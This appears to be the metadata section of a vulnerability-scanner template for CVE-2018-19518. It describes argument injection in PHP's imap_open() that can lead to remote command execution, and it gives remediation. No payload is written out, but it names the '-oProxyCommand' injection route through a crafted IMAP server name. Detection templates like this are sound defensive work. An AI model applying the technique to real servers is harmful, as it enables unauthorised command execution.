id: CVE-2018-19518

info:
  name: PHP imap - Remote Command Execution
  author: princechaddha
  severity: high
  description: |
    University of Washington IMAP Toolkit 2007f on UNIX, as used in imap_open() in PHP and other products, launches an rsh command (by means of the imap_rimap function in c-client/imap4r1.c and the tcp_aopen function in osdep/unix/tcp_unix.c) without preventing argument injection, which might allow remote attackers to execute arbitrary OS commands if the IMAP server name is untrusted input (e.g., entered by a user of a web application) and if rsh has been replaced by a program with different argument semantics. For example, if rsh is a link to ssh (as seen on Debian and Ubuntu systems), then the attack can use an IMAP server name containing a "-oProxyCommand" argument.
  impact: |
    Attackers can inject arbitrary OS commands through malicious IMAP server names when using imap_open() in PHP, potentially achieving remote code execution on servers where rsh is linked to ssh.
  remediation: |
    Upgrade to University of Washington IMAP Toolkit versions that properly sanitize IMAP server name arguments, or restrict usage of imap_open() with untrusted input.
